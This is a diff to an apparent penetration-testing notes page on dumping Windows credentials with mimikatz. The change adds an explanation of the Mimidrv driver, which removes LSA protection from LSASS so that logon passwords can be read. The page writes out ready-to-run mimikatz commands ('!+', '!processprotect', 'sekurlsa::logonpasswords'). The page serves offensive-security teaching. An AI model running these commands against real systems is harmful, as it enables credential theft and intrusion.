@@ -10,7 +10,7 @@
 
 {% embed url="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump" %}
 
-2. **Mimidrv**
+2. **Mimidrv in depth**
 
 {% embed url="https://medium.com/@matterpreter/mimidrv-in-depth-4d273d19e148" %}
 
@@ -79,6 +79,10 @@ mimikatz # sekurlsa::minidump lsass.dmp
 
 ### Disable LSA protection
 
+**What is Mimidrv?**
+
+Certain Windows functionalities such as disabling the LSA protection can't be performed from user mode. `Mimidrv.sys` driver works on kernel level to disable the LSA protection via a user mode application.
+
 {% code title="Administrator shell" %}
 ```powershell
 mimikatz # !+
@@ -88,4 +92,9 @@ mimikatz # !processprotect /process:lsass.exe /remove
 mimikatz # sekurlsa::logonpasswords 
 ```
 {% endcode %}
+
+* `!+`: To implant and start the `Mimidrv.sys` driver from user mode
+* `!processprotect:` A function provided by Mimidrv to remove process protection. In our case, it will be the LSASS process.
+
+Refer to the "_Mimidrv in depth_" resource link above for more information.
 
